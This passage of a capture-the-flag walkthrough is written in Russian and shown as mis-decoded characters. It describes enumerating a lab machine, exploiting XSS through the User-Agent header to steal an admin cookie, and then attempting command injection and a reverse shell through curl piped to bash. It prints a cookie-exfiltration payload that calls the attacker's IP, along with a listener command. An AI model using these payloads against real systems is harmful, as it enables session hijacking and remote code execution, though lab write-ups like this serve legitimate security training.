- -sT –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
- -sV, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–µ—Ä—Å–∏–π

–∏ —è –Ω–∞—à–µ–ª –æ—á–µ–Ω—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–µ –≤–µ—â–∏, –µ—Å—Ç—å –¥–≤–∞ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–∞: 22 –∏ 5000, –ø–æ—Ä—Ç 22 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è ssh, –Ω–æ —è –Ω–µ –∑–Ω–∞–ª, –¥–ª—è —á–µ–≥–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è 5000, –ø–æ—ç—Ç–æ–º—É —è –∏—Å–∫–∞–ª –µ–≥–æ –∏ –Ω–∞—à–µ–ª, —á—Ç–æ –æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤ upnp (–ø—Ä–∏–Ω—Ç–µ—Ä—ã, –∫–æ–Ω—Å–æ–ª–∏, —Å–º–∞—Ä—Ç-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞). —Ç–µ–ª–µ–≤–∏–∑–æ—Ä—ã, —Ä–æ—É—Ç–µ—Ä—ã –∏ —Ç. –¥.) 

–ù–∏—á–µ–≥–æ, —á—Ç–æ –º–æ–≥–ª–æ –±—ã –ø—Ä–µ–¥–ª–æ–∂–∏—Ç—å –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É, –∏ —è —Ä–∞–Ω—å—à–µ –Ω–µ —Å–ª—ã—à–∞–ª –æ–± upnp. –Ø –Ω–µ–º–Ω–æ–≥–æ –ø–æ–∫–æ–ø–∞–ª—Å—è –≤ —ç—Ç–æ–º –∏ –Ω–µ —Å–º–æ–≥ –ø–æ–Ω—è—Ç—å, –∫–∞–∫–æ–µ —ç—Ç–æ –∏–º–µ–µ—Ç –ø—Ä—è–º–æ–µ –æ—Ç–Ω–æ—à–µ–Ω–∏–µ –Ω–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç.

–ß—Ç–æ–±—ã —É—Ç–æ—á–Ω–∏—Ç—å, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —ç—Ç–æ—Ç –ø–æ—Ä—Ç, —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª netcat —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å –∫–∞–∫–∏–µ –±–∞–Ω–Ω–µ—Ä—ã —è –ø–æ–ª—É—á—É –¥–ª—è –æ–ø–µ—Ä–¥–µ–ª–µ–Ω–∏–µ —Å–ª—É–∂–±—ã:

```
netcat 10.10.11.8 5000
```

–ò –ø–æ–æ–ª—É—á–∏–ª —á—Ç–æ-—Ç–æ —Ç–∞–∫–æ–µ:

```html
<!DOCTYPE HTML>  
<html lang="en">  
¬†¬†¬†<head>  
¬†¬†¬†¬†¬†¬†¬†<meta charset="utf-8">  
¬†¬†¬†¬†¬†¬†¬†<title>Error response</title>  
¬†¬†¬†</head>  
¬†¬†¬†<body>  
¬†¬†¬†¬†¬†¬†¬†<h1>Error response</h1>  
¬†¬†¬†¬†¬†¬†¬†<p>Error code: 400</p>  
¬†¬†¬†¬†¬†¬†¬†<p>Message: Bad request syntax ('Hello').</p>  
¬†¬†¬†¬†¬†¬†¬†<p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>  
¬†¬†¬†</body>  
</html>
```
   
–û–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è —á—Ç–æ —ç—Ç–æ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä, –∞ —Ç–∞–∫–æ–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç —è –ø–æ–ª—É—á–∏–ª –ø–æ—Ç–æ–º—É —á—Ç–æ –æ—Ç–ø—Ä–∞–≤–∏–ª –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π http-–∑–∞–ø—Ä–æ—Å —Å netcat (–ï—Å–ª–∏ –º—ã –æ—Ç–ø—Ä–∞–∏–º http-–∑–∞–ø—Ä–æ—Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å –ø.–º. netcat, —Ç–æ –ø–æ–ª—É—á–∏–º –∏—Å—Ö–æ–¥–Ω–∏–∫ –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—ã). –ï—Å–ª–∏ –ø–µ—Ä–µ–π–¥—ë–º –ø–æ –∞–¥—Ä–µ—Å—É —Å –ø.–º. –±—Ä–∞—É–∑–µ—Ä–∞, —Ç–æ –ø–æ–ª—É—á–∏–º —Å—Ç—Ä–∞–Ω–∏—Ü—É.

![[Pasted image 20240427205821.png]]

## –ü–æ–∏—Å–∫ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤ 

–ö–∞–∫ –≤–∏–¥–∏—Ç–µ, —ç—Ç–æ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —Å –æ–±—Ä–∞—Ç–Ω—ã–º –æ—Ç—Å—á–µ—Ç–æ–º –∏ –∫–Ω–æ–ø–∫–æ–π –¥–ª—è –≤–æ–ø—Ä–æ—Å–æ–≤, —á–µ—Å—Ç–Ω–æ –≥–æ–≤–æ—Ä—è, –Ω–∏—á–µ–≥–æ –æ—Å–æ–±–µ–Ω–Ω–æ–≥–æ. –û—Ç–ª–∏—á–Ω–æ, –¥–∞–≤–∞–π—Ç–µ –∏–∑—É—á–∏–º —Å—Ç—Ä–∞–Ω–∏—Ü—É. –ö–∞–∂–µ—Ç—Å—è, –µ—Å—Ç—å —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω –≤–∞—Ä–∏–∞–Ω—Ç –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è. –î–∞–≤–∞–π—Ç–µ –≤—ã–ø–æ–ª–Ω–∏–º –±—ã—Å—Ç—Ä—ã–π –ø–æ–∏—Å–∫ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤:

![[Pasted image 20240427210033.png]]

—è –±—É–¥—É –∏—Å–∫–∞—Ç—å –ª—é–±—ã–µ —Å–∫—Ä—ã—Ç—ã–µ –ø—É—Ç–∏, —è –±—É–¥—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å dirsearch, –Ω–æ, –∫–æ–Ω–µ—á–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ, —á—Ç–æ –≤–∞–º —É–¥–æ–±–Ω–æ

dirsearch —Ä–∞–±–æ—Ç–∞–ª –æ–∫–æ–ª–æ 15 –º–∏–Ω—É—Ç, –Ω–æ —è –Ω–µ –Ω–∞—à–µ–ª –Ω–∏—á–µ–≥–æ, –∫—Ä–æ–º–µ /support –∏ /dashboard, –Ω–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä –∫–æ—Ç–æ—Ä—ã—Ö —É –º–µ–Ω—è –Ω–µ—Ç –ø—Ä–∞–≤. –Ø —Ç–∞–∫–∂–µ –ø–æ—Å–º–æ—Ç—Ä–µ–ª –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –µ—Å—Ç—å –ª–∏ –∫–∞–∫–∏–µ-–ª–∏–±–æ –∫–æ–Ω–µ—á–Ω—ã–µ —Ç–æ—á–∫–∏ –∏–ª–∏ js-—Ñ–∞–π–ª—ã, –∫–æ—Ç–æ—Ä—ã–µ —è –º–æ–≥—É –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å, –Ω–æ —ç—Ç–æ –±—ã–ª –º–µ—Ä—Ç–≤—ã–π –∫–æ–Ω–µ—Ü

–Ø –æ—Å—Ç–∞–≤–∏–ª –µ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—ã–º, –Ω–æ –¥—Ä—É–≥–∏—Ö –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤, –ø–æ—Ö–æ–∂–µ, –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç ‚Äî –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –ø–æ–¥–¥–µ—Ä–∂–∫—É. 

![[Pasted image 20240427210127.png]]

## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–•–æ—Ä–æ—à–æ, —É –Ω–∞ —Å–µ—Å—Ç—å —Ñ–æ—Ä–º–∞ ‚Äî –º–æ–∂–µ—Ç –±—ã—Ç—å, –º—ã —Å–º–æ–∂–µ–º –µ—é –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞—Ç—å? –ù—É –∞ –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ –Ω–µ–≥–æ –ª—é–±–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ—Ö–æ–∂–µ —É—Ö–æ–¥–∏—Ç –≤ –ø—Ä–æ–ø–∞—Å—Ç—å ‚Äî –Ω–µ—Ç –æ—Ç–≤–µ—Ç–∞, –ø–æ–¥—Å–∫–∞–∑—ã–≤–∞—é—â–µ–≥–æ, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π. –ú—ã –º–æ–∂–µ–º –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç—å, —á—Ç–æ –æ–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä, –Ω–æ —Ö–º?

–Ø –ø–æ–ø—Ä–æ–±—É—é –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –∏ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, –Ω–µ –≤—ã–¥–∞—Å—Ç –ª–∏ —ç—Ç–æ –∫–∞–∫–∏—Ö-–ª–∏–±–æ –æ—à–∏–±–æ–∫.

![[Pasted image 20240427211105.png]]

–ö–∞–∫ –≤–∏–¥–∏—Ç–µ, –º—ã —Ä–∞–∑–æ–∑–ª–∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –∏ —ç—Ç–æ –∞–±—Å–æ–ª—é—Ç–Ω—ã–π —É—Å–ø–µ—Ö. –ú–Ω–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ —Å—Ç–∞–ª–æ –∏–∑ –∑–∞ —á–µ–≥–æ —è —Ä–∞–∑–æ–∑–ª–∏–ª –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ. –û–ö, —ç—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ. –¢–∞–∫–æ–µ –æ—â—É—â–µ–Ω–∏–µ, —á—Ç–æ –º—ã –¥–æ–ª–∂–Ω—ã –∏–º–µ—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞—Ç—å —á–µ–º-—Ç–æ –∑–¥–µ—Å—å, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Ç–æ, —á—Ç–æ –º—ã —Ö–æ—Ç–∏–º.

–Ø —Ç–æ–ª—å–∫–æ —á—Ç–æ –∑–∞–º–µ—Ç–∏–ª –∫–æ–µ-—á—Ç–æ: –≤ –∑–∞–ø—Ä–æ—Å–µ, –∫–æ—Ç–æ—Ä—ã–π –º—ã –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ —Å–ª—É–∂–±—É –ø–æ–¥–¥–µ—Ä–∂–∫–∏, –ø–∞—Ä–∞–º–µ—Ç—Ä cookie is_admin –∏–º–µ–µ—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, hashid —Å–∫–∞–∑–∞–ª, —á—Ç–æ —ç—Ç–æ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ö—ç—à, —Ç–∞–∫ —á—Ç–æ —ç—Ç–æ —Ç—É–ø–∏–∫?

–ß—Ç–æ —è –∑–∞–º–µ—Ç–∏–ª, —Ç–∞–∫ —ç—Ç–æ —Ç–æ, —á—Ç–æ —Ñ–∞–π–ª cookie –±—ã–ª ¬´is_admin¬ª, —á—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ. –ö–∞–∂–µ—Ç—Å—è, —á—Ç–æ –æ–Ω–æ –Ω–µ –º–µ–Ω—è–µ—Ç—Å—è, —á—Ç–æ, –±–µ–∑—É—Å–ª–æ–≤–Ω–æ, –≥–æ–≤–æ—Ä–∏—Ç –æ –±–æ–ª—å—à–µ–º.

–ü—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É /dashboard –∫–æ—Ç–æ—Ä—ã–π –º—ã –Ω–∞—à–ª–∏ —Å.–ø. dirsearch –º—ã –ø–æ–ª—É—á–∞–µ–º:

![[Pasted image 20240428014936.png]]

–Ø –∑–∞–º–µ—Ç–∏–ª –∫–æ–µ-—á—Ç–æ, –∫–æ–≥–¥–∞ –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π –±–µ—Å—Ö–∞—Ä–∞–∫—Ç–µ—Ä–Ω—ã–π (<>) –≤ –ø–æ–ª–µ —Å–æ–æ–±—â–µ–Ω–∏–µ (—Ñ–æ—Ä–º–∞), —Ç–∞–º –Ω–∞–ø–∏—Å–∞–Ω–æ, —á—Ç–æ –æ–Ω –æ—Ç–ø—Ä–∞–≤–∏—Ç –æ—Ç—á–µ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º –¥–ª—è —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è. –û–±—ã—á–Ω–æ —ç—Ç–æ—Ç –æ—Ç—á–µ—Ç –±—É–¥–µ—Ç –≤ —Ç–æ–º –∂–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∏–ª–∏ –ø–æ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç–µ, –±—É–¥–µ–º –Ω–∞–¥–µ—è—Ç—å—Å—è, —á—Ç–æ —ç—Ç–æ –æ–¥–Ω–æ –∏ —Ç–æ –∂–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, —Ç–∞–∫ —á—Ç–æ, –≤–æ–∑–º–æ–∂–Ω–æ, –º—ã —Å–º–æ–∂–µ–º —É–∫—Ä–∞—Å—Ç—å —Å–µ–∞–Ω—Å –∏–ª–∏ –ª—é–±–æ–π –∑–∞—Ö–≤–∞—Ç —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏. 

–ü–æ—Å–ª–µ –º–Ω–æ–∂–µ—Å—Ç–≤–∞ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ —è –æ–±–Ω–∞—Ä—É–∂–∏–ª, —á—Ç–æ —è –≥–ª—É–ø, –ø–æ—Å–∫–æ–ª—å–∫—É –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –±—ã–ª –æ—Ç—Ä–∞–∂–µ–Ω –∑–∞–ø—Ä–æ—Å, –≤–æ–∑–º–æ–∂–Ω–æ, –≤ –Ω–µ–º –µ—Å—Ç—å xss.–¢–∞–∫ –∫–∞–∫ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –¥–µ—Ç–µ–∫—Ç–æ—Ä–∞ –Ω–∞–º –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç http-–∑–∞–ø—Ä–æ—Å, —Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ –º–æ–∂–Ω–æ –≤–Ω–µ–¥—Ä–∏—Ç—å JS-–∫–æ–¥ –≤ –∑–∞–≥–æ–ª–æ–≤–æ–∫ User-Agent –∏ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –¥–µ—Ç–µ–∫—Ç–æ—Ä–∞ –ø–æ–∫–∞–∑–∞—Ç—å –∑–∞–ø—Ä–æ—Å —Å –≤–Ω–µ–¥—Ä–µ–Ω–Ω—ã–º –∫–æ–¥–æ–º, —Ç–æ –≤–Ω–µ–¥—Ä–µ–Ω–Ω—ã–π –∫–æ–¥ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω. 

–¢–æ –µ—Å—Ç—å, –≤ —Å–∞–º–æ–º –ø–æ–ª–µ —Å–æ–æ–±—â–µ–Ω–∏–∏ (—Ñ–æ—Ä–º—ã) –Ω–µ—Ç XSS, —Ç—É–¥–∞ –º—ã –∫–∏–¥–∞–µ–º —Å–∏–º–≤–æ–ª—ã (<>) —á—Ç–æ–±—ã –¥–µ—Ç–µ–∫—Ç–æ—Ä –µ–≥–æ –æ–±–Ω–∞—Ä—É–∂–∏–ª –∏ –∫–∏–¥–∞–ª –Ω–∞–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≥–¥–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –Ω–∞—à –∑–∞–ø—Ä–æ—Å, –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞ –º—ã –≤–Ω–µ–¥—Ä—è–µ–º –∫–æ–¥, –∞ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –ø–æ–∫–∞–∑–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–¥. –û–¥–Ω–∏–º –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ–º: "–°–∏–º–≤–æ–ª—ã (<>) –∫–∏–¥–∞–µ—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É —Å –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ–º, –≥–¥–µ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è xss –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –≤–Ω–µ–¥—Ä–µ–Ω —Å –ø–æ–º–æ—â—å—é User-Agent".

## –ö—Ä–∞–∂–∞ cookie

–°–Ω–∞—á–∞–ª–æ —è –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª –æ–±—ã—á–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É:

```js
<script>alert(document.cookie)</script>
```

–ò–ª–∏:

```js
<img src=x onerror=alert(document.cookie)>
```

![[Pasted image 20240427215649.png]]

—Ç–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –∫—Ä–∞—Å—Ç—å —Ñ–∞–π–ª—ã cookie –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ xss, —ç—Ç–æ –¥–æ–≤–æ–ª—å–Ω–æ –ø—Ä–æ—Å—Ç–æ, –≤–æ—Ç –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∫–æ—Ç–æ—Ä—É—é —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª

```js
<img src=x onerror=fetch('http://{you-ip}/'+document.cookie);>
```

–≤–∞–º —Ç–∞–∫–∂–µ –Ω—É–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —Ñ–∞–π–ª—ã cookie. –Ø —Å–æ–±–∏—Ä–∞—é—Å—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–æ—Å—Ç–æ–π http-—Å–µ—Ä–≤–µ—Ä –Ω–∞ Python, –Ω–æ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ª—é–±–æ–π –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å, –∫–æ—Ç–æ—Ä—ã–π –∑–∞—Ö–æ—Ç–∏—Ç–µ.

```python
python3 -m http.server 80
```

–∫–æ–≥–¥–∞ –æ–Ω –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É, –æ–Ω –≤–µ—Ä–Ω–µ—Ç –µ–≥–æ —Ñ–∞–π–ª—ã cookie, –∏ —ç—Ç–æ —Å—Ä–∞–±–æ—Ç–∞–ª–æ!

![[Pasted image 20240427220121.png]]

![[Pasted image 20240428015421.png]]

–∫–∞–∫ –≤—ã –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç—å, –º—ã –ø–æ–ª—É—á–∏–ª–∏ —Ñ–∞–π–ª cookie, —Ç–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ is_Admin –∏ —Å–Ω–æ–≤–∞ –∑–∞–π–¥–µ–º –Ω–∞ –ø–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è (dashboard). –ú—ã –ø–æ–º–µ–Ω—è–ª–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ is_Admin –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞ –∏ –ø–æ–ª—É—á–∏–ª–∏ —Ç–∞–∫–æ–π –æ—Ç–≤–µ—Ç:

![[Pasted image 20240427220250.png]]

–ò–ª–∏ –ø—Ä–æ—Å—Ç–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ –º–æ–∂–µ—Ç–µ –ø–æ–º–µ–Ω—è—Ç—å cookie, –Ω–æ —è –ø—Ä–µ–¥–ø–æ—á–∏—Ç–∞—é burp)

–ò–∑–º–µ–Ω–µ–Ω–∏–µ –¥–∞—Ç—ã, –ø–æ—Ö–æ–∂–µ, –Ω–∏—á–µ–≥–æ –Ω–µ –º–µ–Ω—è–µ—Ç. –Ø –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏–ª –æ—Ç—Ä—ã–∂–∫—É –∏ –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª –Ω–µ—Å–∫–æ–ª—å–∫–æ —É–∫–æ–ª–æ–≤ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏:

![[Pasted image 20240427220734.png]]

–•–º, –±–µ–∑—É—Å–ø–µ—à–Ω–æ. –í–æ–∑–º–æ–∂–Ω–æ, –æ–±—â–∏–µ –∫–æ–º–∞–Ω–¥—ã —Ä–∞–±–æ—Ç–∞—é—Ç?

![[Pasted image 20240427220747.png]]

–ö–∞–∂–µ—Ç—Å—è, –µ—Å–ª–∏ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç—å, —á—Ç–æ –º—ã dvir? –î–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –¥—Ä—É–≥–∏–µ.

![[Pasted image 20240427220855.png]]

–∫–∞–∫ –≤—ã –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç—å, –æ–Ω –≤–µ—Ä–Ω—É–ª —Ä–∞–±–æ—á–∏–π –∫–∞—Ç–∞–ª–æ–≥. 

![[Pasted image 20240427220911.png]]

–¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –∏ –≤—Å–ø–æ–º–Ω–∏–º, —á—Ç–æ —ç—Ç–æ –º–∞—à–∏–Ω–∞ —Å Linux. –û–û–û–û, –º–æ–∂–µ—Ç –±—ã—Ç—å, –º—ã —Å–º–æ–∂–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å netcat –≤ report.sh? –í–æ-–ø–µ—Ä–≤—ã—Ö, —è —Ö–æ—á—É –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª, –ø—Ä–µ–∂–¥–µ —á–µ–º —Å–ª–∏—à–∫–æ–º —Ä–∞–∑–≤–æ–ª–Ω–æ–≤–∞—Ç—å—Å—è.

![[Pasted image 20240427233345.png]]

–ò—Ç–∞–∫, —Ç–µ—Å—Ç mkdir —Å—Ä–∞–±–æ—Ç–∞–ª.

–•–æ—Ä–æ—à–æ, –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º‚Ä¶ –í–æ–∑–º–æ–∂–Ω–æ, –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å —Å–µ—Ä–≤–µ—Ä, –µ—Å–ª–∏ —á—Ç–æ-—Ç–æ –ø–æ–π–¥–µ—Ç –Ω–µ —Ç–∞–∫!

![[Pasted image 20240427233502.png]]

![[Pasted image 20240427233510.png]]

–û, —ç—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ. –î–∞–≤–∞–π –µ—â–µ —Ä–∞–∑ –ø–æ–ø—Ä–æ–±—É–µ–º‚Ä¶

–ù—É, —è –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑–Ω—ã—Ö –≤–µ—â–µ–π, –Ω–æ —Ç–µ–ø–µ—Ä—å –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–ª—É—á–∏–ª –≤–∑–∞–º–µ–Ω, —Ç–∞–∫ —á—Ç–æ, –≤–µ—Ä–æ—è—Ç–Ω–æ, —è –µ–≥–æ —Å–ª–æ–º–∞–ª! –î–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏–º—Å—è –∏ –ø–æ–ø—Ä–æ–±—É–µ–º –µ—â–µ —Ä–∞–∑.

–ü–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ —è –ø—Ä–æ–≤–µ—Ä–∏–ª, –∫–∞–∫–∏–µ –µ—â–µ –∫–æ–º–∞–Ω–¥—ã —Ä–∞–±–æ—Ç–∞—é—Ç, –∏ –æ–±–Ω–∞—Ä—É–∂–∏–ª, —á—Ç–æ Curl —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ:

![[Pasted image 20240427233617.png]]

–ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ, —Å–º–æ–≥—É –ª–∏ —è —Å–≤–µ—Ä–Ω—É—Ç—å —Å–≤–æ—é —Ä–∞–∫—É—à–∫—É?

–ò—Ç–∞–∫, —è –ø–æ–º–µ—Å—Ç–∏–ª –æ–±–æ–ª–æ—á–∫—É –≤ shell.sh. –Ø —Ç–∞–∫–∂–µ –ø–µ—Ä–µ–Ω–µ—Å—É —ç—Ç–æ –ø—Ä—è–º–æ –≤ bash ‚Äî —ç—Ç–æ –ø–æ—Ç–æ–º—É, —á—Ç–æ —è –Ω–µ –º–æ–≥ –ø—Ä–∏–¥—É–º–∞—Ç—å, –∫–∞–∫ –∑–∞–ø—É—Å—Ç–∏—Ç—å bash —Ä–∞–Ω—å—à–µ, —Ç–∞–∫ —á—Ç–æ —ç—Ç–æ –º–æ–∂–µ—Ç —Å—Ä–∞–±–æ—Ç–∞—Ç—å!

![[Pasted image 20240427233636.png]]

–£ –º–µ–Ω—è –Ω–∏—á–µ–≥–æ –Ω–µ –±—ã–ª–æ, –Ω–æ –ø–æ—Ç–æ–º —è –ø–æ–Ω—è–ª, —á—Ç–æ —Å–æ—Ö—Ä–∞–Ω–∏–ª –µ–≥–æ –Ω–µ –∫–∞–∫ Shell.sh, –∞ –∫–∞–∫ test.sh:

![[Pasted image 20240427233652.png]]

## –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∏—Å—Ç–µ–º–µ 

–ò—Ç–∞–∫, —É—Å–ø–µ—Ö‚Ä¶ –Ω–æ –Ω–µ –æ—Ç–≤–µ—Ç? –ò–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π.

–ó–∞—Ç–µ–º —è –ø–æ–Ω—è–ª, —á—Ç–æ –Ω–∞–∑–≤–∞–ª –µ–≥–æ ¬´shell.sh¬ª ‚Äî —è –±—ã–ª –Ω–µ –≤ —Ç–æ–π –ø–∞–ø–∫–µ. –£–ø—Å!!

